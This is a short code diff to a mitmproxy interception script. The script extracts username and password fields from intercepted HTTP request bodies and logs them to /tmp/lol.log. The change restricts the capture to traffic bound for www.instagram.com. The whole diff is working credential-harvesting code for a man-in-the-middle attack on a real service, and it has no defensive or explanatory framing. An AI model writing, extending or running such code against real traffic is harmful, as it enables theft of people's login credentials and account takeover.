@@ -9,8 +9,9 @@ from mitmproxy import http
 
 
 def response(flow: http.HTTPFlow) -> None:
-    data = re.findall(b'(password=[^&]*|username=[^&]*)', flow.request.content)
-    if data:
-        with open('/tmp/lol.log', 'a') as f:
-            f.write(str(data) + '\n')
+    if flow.request.pretty_host == 'www.instagram.com':
+        data = re.findall(b'(password=[^&]*|username=[^&]*)', flow.request.content)
+        if data:
+            with open('/tmp/lol.log', 'a') as f:
+                f.write(str(data) + '\n')
 
